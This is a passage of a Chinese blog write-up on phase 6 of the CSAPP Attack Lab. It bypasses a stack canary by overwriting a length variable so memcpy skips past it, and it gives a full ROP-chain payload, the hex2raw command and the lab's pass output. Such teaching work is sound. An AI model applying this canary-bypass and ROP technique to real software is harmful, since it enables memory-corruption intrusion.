<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e48</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	e8 f3 f2 ff ff       	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">call</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">   401140</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> &lt;memcpy@plt&gt;</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401e4d</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">	b8 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">01</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    $0x1,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">eax</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e52</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">48</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> 8b </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">75</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> f8          	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">mov</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    -</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0x8</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">(%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rbp</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">),%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsi</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e56</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">64</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 48</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 33</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 34</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 25</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 28</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> 	xor</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">    %</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">fs</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0x28</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">,%</span><span style="--shiki-light:#1E754F;--shiki-dark:#4D9375;">rsi</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401e5d</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span></span>
<span class="line"><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">  401e5f</span><span style="--shiki-light:#999999;--shiki-light-font-style:italic;--shiki-dark:#666666;--shiki-dark-font-style:italic;">:</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">	74</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 05</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">                	je</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">     401e66</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;"> &lt;getbuf_withcanary+</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">0x70</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e61</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	e8 </span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">72</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 07</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;"> 00</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">       	call</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">   4025d8 &lt;__stack_chk_fail&gt;</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e66</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	c9                   	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">leave</span></span>
<span class="line"><span style="--shiki-light:#2F798A;--shiki-dark:#4C9A91;">  401e67</span><span style="--shiki-light:#393A34;--shiki-dark:#DBD7CAEE;">:	c3                   	</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;">ret</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们需要构造一个输入，使得 <code>getbuf_withcanary</code> 函数返回后，调用 <code>touch3</code> 函数。但由于栈随机化，我们需要利用 ROP 技术，通过一系列的 gadgets 来实现对 <code>touch3</code> 函数的调用。</p><p>可以看到，<code>getbuf_withcanary</code> 函数中有两个缓冲区 <code>buf</code> 和 <code>logMsg</code>，并且 <code>memcpy</code> 函数会将 <code>buf</code> 中一定长度的内容复制到 <code>logMsg</code> 中。由于栈溢出保护，我们无法直接通过 <code>buf</code> 覆盖返回地址，那样会修改金丝雀值，那有没有可以绕过金丝雀值，直接覆写返回地址的方法呢？有的，兄弟，有的。我们可以利用 <code>memcpy</code> 函数配合 <code>len</code> 作为偏移量越过金丝雀值来实现 ROP 攻击。</p><p>首先，我们需要知道 <code>getbuf_withcanary</code> 函数的栈空间结构，通过阅读汇编代码或调试可以得到如下栈布局：</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>单位：字节</span></span>
<span class="line"><span>+-------------------+</span></span>
<span class="line"><span>|   return addr[8]  |</span></span>
<span class="line"><span>+-------------------+</span></span>
<span class="line"><span>|      %rbp[8]      |</span></span>
<span class="line"><span>+-------------------+</span></span>
<span class="line"><span>|     canary[8]     |</span></span>
<span class="line"><span>+-------------------+</span></span>
<span class="line"><span>|       [16]        |</span></span>
<span class="line"><span>+-------------------+</span></span>
<span class="line"><span>|  len[4]  |        |</span></span>
<span class="line"><span>+-------------------+</span></span>
<span class="line"><span>|     buf[128]      |</span></span>
<span class="line"><span>+-------------------+</span></span>
<span class="line"><span>|    logMsg[128]    |</span></span>
<span class="line"><span>+-------------------+</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们发现 <code>len</code> 变量位于 <code>buf</code> 之后，因此我们可以通过 <code>buf</code> 来覆写 <code>len</code> 的值，从而控制 <code>memcpy</code> 函数的复制字符串的目的地址，进而实现 ROP 攻击。需要注意，<code>memcpy</code> 函数只复制 128 字节，这意味着我们的 ROP 链不能过长。</p><p>接下来，我们只需要计算好偏移量，然后照搬 phase 5 的 ROP 链即可。注意 phase 6 中的 <code>touch3</code> 和对应 <code>gadget</code> 地址与 phase 5 不同。</p><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>/* phase6.txt */</span></span>
<span class="line"><span>eb 1e 40 00 00 00 00 00 /* Gadget 1 */</span></span>
<span class="line"><span>83 1e 40 00 00 00 00 00 /* Gadget 2 */</span></span>
<span class="line"><span>a3 1e 40 00 00 00 00 00 /* Gadget 3 */</span></span>
<span class="line"><span>48 00 00 00 00 00 00 00 /* Bias value 72 */</span></span>
<span class="line"><span>8a 1f 40 00 00 00 00 00 /* Gadget 4 */</span></span>
<span class="line"><span>95 1f 40 00 00 00 00 00 /* Gadget 5 */</span></span>
<span class="line"><span>00 1f 40 00 00 00 00 00 /* Gadget 6 */</span></span>
<span class="line"><span>d6 1e 40 00 00 00 00 00 /* Gadget 7 */</span></span>
<span class="line"><span>83 1e 40 00 00 00 00 00 /* Gadget 8 */</span></span>
<span class="line"><span>22 1d 40 00 00 00 00 00 /* Address of touch3 function */</span></span>
<span class="line"><span>32 34 63 38 63 65 36 36 /* cookie string &quot;24c8ce66&quot; */</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00 00 00 00 00</span></span>
<span class="line"><span>00 00 00 00</span></span>
<span class="line"><span>28 01 00 00 /* len value 296 */</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>转换为原始字节序列并传递给 <code>starget</code> 程序：</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#59873A;--shiki-dark:#80A665;">cat</span><span style="--shiki-light:#B56959;--shiki-dark:#C98A7D;"> phase6.txt</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./hex2raw</span><span style="--shiki-light:#AB5959;--shiki-dark:#CB7676;"> |</span><span style="--shiki-light:#59873A;--shiki-dark:#80A665;"> ./starget</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-highlighter="shiki" data-ext="text" style="--shiki-light:#393a34;--shiki-dark:#dbd7caee;--shiki-light-bg:#ffffff;--shiki-dark-bg:#121212;"><pre class="shiki shiki-themes vitesse-light vitesse-dark vp-code"><code class="language-text"><span class="line"><span>Cookie: 0x24c8ce66</span></span>
<span class="line"><span>Type string:Touch3!: You called touch3(&quot;24c8ce66&quot;)</span></span>
<span class="line"><span>Valid solution for level 3 with target starget</span></span>
<span class="line"><span>PASS: Sent exploit string to server to be validated.</span></span>
<span class="line"><span>NICE JOB!</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><hr><p><a href="https://arthals.ink/blog/attack-lab" target="_blank" rel="noopener noreferrer">更适合北大宝宝体质的 Attack Lab 踩坑记</a></p><p><a href="https://www.wdxtub.com/blog/csapp/thick-csapp-lab-3" target="_blank" rel="noopener noreferrer">读厚 CSAPP III Attack Lab</a></p></div><!----><!----><div class="vp-doc-copyright" data-v-9999e088><h2 id="doc-copyright" tabindex="-1" class="vp-doc-header" data-v-061688d6><a href="#doc-copyright" class="header-anchor" data-v-061688d6><span data-v-061688d6><!--[-->版权所有<!--]--></span></a></h2><div class="vp-copyright" data-v-10ae089b><span class="copyright-mask" data-v-10ae089b></span><p data-v-10ae089b><span data-v-10ae089b>版权归属：</span><a class="vp-link link no-icon vp-external-link-icon" href="https://github.com/Staaaaaaaaar" target="_blank" rel="noreferrer" data-v-10ae089b><!--[-->Staaaaaaaaar<!--]--></a></p><!----><p data-v-10ae089b><span data-v-10ae089b>许可证：</span><a class="vp-link link no-icon vp-external-link-icon" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noreferrer" data-v-10ae089b><!--[-->署名-非商业性-相同方式共享 4.0 国际 (CC-BY-NC-SA-4.0)<!--]--></a><!--[--><span class="vpi-license-cc" data-v-10ae089b></span><span class="vpi-license-by" data-v-10ae089b></span><span class="vpi-license-nc" data-v-10ae089b></span><span class="vpi-license-sa" data-v-10ae089b></span><!--]--></p></div></div><footer class="vp-doc-footer" data-v-9999e088 data-v-c7949b5f><!--[--><!--]--><div class="edit-info" data-v-c7949b5f><div class="edit-link" data-v-c7949b5f><a class="vp-link link no-icon vp-external-link-icon edit-link-button" href="https://github.com/staaaaaaaaar/staaaaaaaaar.github.io/edit/main/docs/blog/实验/ics-attacklab.md" target="_blank" rel="noreferrer" data-v-c7949b5f><!--[--><span class="vpi-square-pen edit-link-icon" aria-label="edit icon" data-v-c7949b5f></span> 编辑此页<!--]--></a></div><!----></div><div class="contributors" aria-label="Contributors" data-v-c7949b5f><span class="contributors-label" data-v-c7949b5f>贡献者: </span><span class="contributors-info" data-v-c7949b5f><!--[--><!--[--><span class="contributor" data-v-c7949b5f>Staaaaaaaaar</span><!----><!--]--><!--]--></span></div><nav class="prev-next" data-v-c7949b5f><div class="pager" data-v-c7949b5f><a class="vp-link link pager-link prev" href="/article/3lmjvpr0/" data-v-c7949b5f><!--[--><span class="desc" data-v-c7949b5f>上一页</span><span class="title" data-v-c7949b5f><!----><span data-v-c7949b5f>ICS - Arch Lab | 处理器太慢怎么办？</span></span><!--]--></a></div><div class="pager" data-v-c7949b5f><a class="vp-link link pager-link next" href="/article/5yq4gosl/" data-v-c7949b5f><!--[--><span class="desc" data-v-c7949b5f>下一页</span><span class="title" data-v-c7949b5f><!----><span data-v-c7949b5f>Fluid + LeanCloud | 启用网页统计配置</span></span><!--]--></a></div></nav></footer></div><!--]--></main><!----><!--[--><!--]--></div></div></div><!--[--><!--]--></div></div><!--]--><button type="button" class="vp-back-to-top" aria-label="back to top" data-v-91d48f1e style="display:none;" data-v-c8d1f8c7><span class="percent" data-allow-mismatch data-v-c8d1f8c7>0%</span><span class="show icon vpi-back-to-top" data-v-c8d1f8c7></span><svg aria-hidden="true" data-v-c8d1f8c7><circle cx="50%" cy="50%" data-allow-mismatch style="stroke-dasharray:calc(0% - 12.566370614359172px) calc(314.1592653589793% - 12.566370614359172px);" data-v-c8d1f8c7></circle></svg></button><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewbox="0 0 24 24" aria-label="sign down" class="vp-sign-down" aria-hidden="true" data-v-91d48f1e style="display:none;" data-v-791023f6><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" data-v-791023f6><path d="m19 11l-7 6l-7-6" data-v-791023f6></path><path d="m19 5l-7 6l-7-6" opacity="0.6" data-v-791023f6></path></g></svg><footer class="vp-footer" vp-footer data-v-91d48f1e data-v-39a68a3a><!--[--><div class="container" data-v-39a68a3a><div class="message" data-v-39a68a3a>Powered by <a target="_blank" href="https://v2.vuepress.vuejs.org/">VuePress</a> & <a target="_blank" href="https://theme-plume.vuejs.press">vuepress-theme-plume</a></div><!----></div><!--]--></footer><!--[--><!--]--><!--]--></div><!----><!--]--><!--[--><!--]--><!--]--></div><script type="module" src="/assets/app-Db1faIqK.js" defer></script></body></html>